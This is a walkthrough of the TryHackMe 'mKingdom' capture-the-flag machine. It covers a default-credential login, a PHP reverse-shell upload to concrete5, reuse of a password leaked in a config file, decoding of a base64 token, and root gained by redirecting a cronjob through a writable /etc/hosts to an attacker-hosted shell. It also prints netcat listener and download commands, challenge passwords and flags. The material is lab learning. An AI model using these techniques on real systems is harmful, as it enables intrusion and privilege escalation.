- - - 
created : 24-07-2025 

Tags : #easy 
- - - 
# Objective

Try to root the machine!
# Recon

## Rustscan - Nmap

We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/mKingdom]
└─$ rustscan -a mario.thm -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
To scan or not to scan? That is the question.

[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.229.133:85

PORT   STATE SERVICE REASON         VERSION
85/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 0H N0! PWN3D 4G4IN
|_http-server-header: Apache/2.4.7 (Ubuntu)
```

Apache/2.4.7 (Ubuntu) Server at mario.thm Port 85
# Enumeration

## HTTP (85)

Let's visit the [Webpage](../../3%20-%20Tags/Hacking%20Concepts/Webpage.md) :

![Pasted image 20250724142602.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250724142602.png)

Now we use [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) tu find hidden directories-files :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/mKingdom]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt  -u http://mario.thm:85 -

/.htaccess            (Status: 403) [Size: 285]
/.htpasswd            (Status: 403) [Size: 285]
/app                  (Status: 301) [Size: 306] [--> http://mario.thm:85/app/]
/server-status        (Status: 403) [Size: 289]
Progress: 20478 / 20479 (100.00%)

```

/app :

![Pasted image 20250724143028.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250724143028.png)

![Pasted image 20250724143104.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250724143104.png)

![Pasted image 20250724143132.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250724143132.png)
## Caido

We can try password [Bruteforcing](../../3%20-%20Tags/Hacking%20Concepts/Bruteforcing.md) with [Caido](../../3%20-%20Tags/Hacking%20Tools/Caido.md) :

![Pasted image 20250724144131.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250724144131.png)

And we got IP banned :

![Pasted image 20250724144407.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250724144407.png)

LoL So no [Bruteforcing](../../3%20-%20Tags/Hacking%20Concepts/Bruteforcing.md) .

If we simply try `admin: password` it works :

![Pasted image 20250724145630.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250724145630.png)

We search for version and allowed files type  :

![Pasted image 20250724150030.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250724150030.png)

![Pasted image 20250724150258.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250724150258.png)
# Exploit

## Google Search

We search for concrete5 :

![Pasted image 20250724145905.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250724145905.png)

HackerOne :

![Pasted image 20250724150411.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250724150411.png)

So we add php files and we can basically upload a [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) :

![Pasted image 20250724150717.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250724150717.png)

## First Access Netcat

We set up the listener and click on the file :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~]
└─$ nc -lvnp 1337                           
listening on [any] 1337 ...
connect to [10.8.162.183] from (UNKNOWN) [10.10.139.248] 33420
Linux mkingdom.thm 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 09:08:05 up 21 min,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),1003(web)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

## Shell Stabilization

We can have a more stable [Shell](../../3%20-%20Tags/Hacking%20Concepts/Shell.md) performing [Shell Stabilization](../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) :

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@mkingdom:/home$ export TERM=xterm
export TERM=xterm
www-data@mkingdom:/home$ clear
clear
www-data@mkingdom:/home$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                                                  
┌──(mdn0x㉿mdn0xonKali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1337
                               reset
```

# Lateral Movement - Privilege Escalation

## www to Toad

We can find application config files :

```bash
www-data@mkingdom:/var/www/html/app/castle/application/config$ ls
app.php  database.php  doctrine  generated_overrides
www-data@mkingdom:/var/www/html/app/castle/application/config$ cat database.php
<?php

return [
    'default-connection' => 'concrete',
    'connections' => [
        'concrete' => [
            'driver' => 'c5_pdo_mysql',
            'server' => 'localhost',
            'database' => 'mKingdom',
            'username' => 'toad',
            'password' => 'toadisthebest',
            'character_set' => 'utf8',
            'collation' => 'utf8_unicode_ci',
        ],
    ],
];

```

Now we can try password reuse : `su toad` , and we get toad shell.
## Toad to Mario

We check in toad home for something :

```bash
oad@mkingdom:/home$ cd toad
toad@mkingdom:~$ ls
Desktop    Downloads  Pictures  smb.txt    Videos
Documents  Music      Public    Templates
toad@mkingdom:~$ ls -la
total 100
drwxrwx--- 16 toad toad 4096 Jan 29  2024 .
drwxr-xr-x  4 root root 4096 Jun  9  2023 ..
lrwxrwxrwx  1 root root    9 Nov 27  2023 .bash_history -> /dev/null
-rw-r--r--  1 toad toad  220 Jun  8  2023 .bash_logout
-rw-r--r--  1 toad toad 3693 Nov 25  2023 .bashrc
drwx------ 11 toad toad 4096 Nov 28  2023 .cache
drwx------  3 toad toad 4096 Nov 26  2023 .compiz
drwx------ 14 toad toad 4096 Nov 26  2023 .config
drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Desktop
drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Documents
drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Downloads
drwx------  3 toad toad 4096 Dec 10  2023 .gconf
-rw-------  1 toad toad 1710 Dec 10  2023 .ICEauthority
drwx------  3 toad toad 4096 Nov 26  2023 .local
drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Music
-rw-rw-r--  1 toad toad  637 Jan 29  2024 .mysql_history
drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Pictures
-rw-r--r--  1 toad toad  675 Jun  8  2023 .profile
drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Public
-rw-r--r--  1 toad toad  914 Nov 25  2023 smb.txt
drwxrwx---  2 toad toad 4096 Nov 27  2023 .ssh
drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Templates
drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Videos
-rw-------  1 toad toad   57 Dec 10  2023 .Xauthority
-rw-------  1 toad toad 1676 Dec 10  2023 .xsession-errors
-rw-------  1 toad toad 1675 Nov 30  2023 .xsession-errors.old
toad@mkingdom:~$ cat .mysql_history 
CREATE DATABASE mKingdom;
create database 'mKingdom';
show databases;
;
create database 'mkingdom'
ls -al
drop database mkingdom;
show databases;
FLUSH PRIVILEGES;
GRANT ALL PRIVILEGES ON mkingdom.* TO 'toad'@'localhost';
CREATE DATABASE mkingdom;
DROP DATABASE mkingdom;
delete db mkingdom;
exit;
;
eit
FLUSH PRIVILEGES;
GRANT ALL PRIVILEGES ON mkingdom.* TO 'toad'@'localhost';
show databases;
CREATE DATABASE mkingdom;
select * from user;
show tables;
use mysql;
show databases;
EXIT;
FLUSH PRIVILEGES;
GRANT ALL PRIVILEGES ON *.* TO 'toad'@'localhost' WITH GRANT OPTION;
CREATE USER 'toad'@'localhost' IDENTIFIED BY 'toadisthebest';

```

### MySQL

So we can access this [MySQL](../../3%20-%20Tags/Hacking%20Tools/MySQL.md) databases and look for passwords, but we have no credentials.

```bash
toad@mkingdom:~$ mysql -u toad -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 136
Server version: 5.5.62-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mKingdom           |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.00 sec)
```

### Environment

If we check environment stuff : `env` we find a [Base64](../../3%20-%20Tags/Hacking%20Concepts/Base64.md) code :

```
oad@mkingdom:~$ env
APACHE_PID_FILE=/var/run/apache2/apache2.pid
XDG_SESSION_ID=c2
SHELL=/bin/bash
APACHE_RUN_USER=www-data
TERM=xterm
OLDPWD=/home
USER=toad
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:
PWD_token=aWthVGVOVEFOdEVTCg==
MAIL=/var/mail/toad
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
APACHE_LOG_DIR=/var/log/apache2
PWD=/home/toad
LANG=en_US.UTF-8
APACHE_RUN_GROUP=www-data
HOME=/home/toad
SHLVL=2
LOGNAME=toad
LESSOPEN=| /usr/bin/lesspipe %s
XDG_RUNTIME_DIR=/run/user/1002
APACHE_RUN_DIR=/var/run/apache2
APACHE_LOCK_DIR=/var/lock/apache2
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/env

```

`PWD_token=aWthVGVOVEFOdEVTCg==`

So we decrypt :

```
┌──(mdn0x㉿mdn0xonKali)-[~]
└─$ echo 'aWthVGVOVEFOdEVTCg==' | base64 -d                                        
ikaTeNTANtES

```

Now we try switch user and we copy the user flag to /tmp :

```
mario@mkingdom:~$ cat user.txt 
cat: user.txt: Permission denied
mario@mkingdom:~$ cp user.txt /tmp
mario@mkingdom:~$ cd ..
mario@mkingdom:/home$ cd ..
mario@mkingdom:/$ cd tmp
mario@mkingdom:/tmp$ ls
user.txt
mario@mkingdom:/tmp$ cat user.txt 
thm{030a769febb1b3291da1375234b84283}
```

## Mario to Root

### LinPEAS

Let's copy linpeas to the target, we host a simple [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) [Server](../../3%20-%20Tags/Hacking%20Concepts/Server.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/mKingdom]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
```

Now we download and make it executable :

```bash
mario@mkingdom:/tmp$ wget http://10.8.162.183/linpeas.sh /tmp
--2025-07-24 10:14:39--  http://10.8.162.183/linpeas.sh
Connecting to 10.8.162.183:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 954437 (932K) [text/x-sh]
Saving to: ‘linpeas.sh’

100%[======================================>] 954,437      625KB/s   in 1.5s   

2025-07-24 10:14:41 (625 KB/s) - ‘linpeas.sh’ saved [954437/954437]

mario@mkingdom:/tmp$ ls
linpeas.sh  user.txt
mario@mkingdom:/tmp$ chmod +x linpeas.sh 

```

And run it :

```bash
mario@mkingdom:/tmp$ ./linpeas.sh 

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                   
  Group mario:                                                                                                                     
/tmp/linpeas.sh                                                                                                                    
/etc/hosts

```

We can write etc/hosts, during enumeration in the machine we can see also there's a cronjob hitting on the website, we can modify it and get a root [Shell](../../3%20-%20Tags/Hacking%20Concepts/Shell.md), first we modify the /etc/host file :

![Pasted image 20250724164322.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250724164322.png)

Now it's hitting on our [IP address](../../3%20-%20Tags/Hacking%20Concepts/IP%20address.md) .

We have to replicate the path that it was hitting previously, put a [Shell](../../3%20-%20Tags/Hacking%20Concepts/Shell.md) in there, host it and wait :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/mKingdom]
└─$ ls   
linpeas.sh  php-reverse-shell.php

┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/mKingdom]
└─$ mkdir app                      

┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/mKingdom]
└─$ cd app                         

┌──(mdn0x㉿mdn0xonKali)-[~/…/CHALLENGES/Easy/mKingdom/app]
└─$ mkdir castle

┌──(mdn0x㉿mdn0xonKali)-[~/…/CHALLENGES/Easy/mKingdom/app]
└─$ cd castle 

┌──(mdn0x㉿mdn0xonKali)-[~/…/Easy/mKingdom/app/castle]
└─$ mkdir application

┌──(mdn0x㉿mdn0xonKali)-[~/…/Easy/mKingdom/app/castle]
└─$ cd application 

```
## Reverse Shell

We can create a [Payload](../../3%20-%20Tags/Hacking%20Concepts/Payload.md) for the [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) with Hacktricks extensions on firefox :

![Pasted image 20250724165329.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250724165329.png)

Now we create the file and copy this into the file with [Nano](../../3%20-%20Tags/Hacking%20Tools/Nano.md), then host it with a simple [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) [Server](../../3%20-%20Tags/Hacking%20Concepts/Server.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/mKingdom]
└─$ python3 -m http.server 85
Serving HTTP on 0.0.0.0 port 85 (http://0.0.0.0:85/) ...

```

Note that we have used the same port as the requested path, and the same name of the cronjob file .

We open a listener on the same port with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) and wait for root shell :

```
root@mkingdom:/tmp# cat root.txt
cat root.txt
thm{e8b2f52d88b9930503cc16ef48775df0}
```

Copy it to the /tmp cause we can't read it in root home .    Pwned .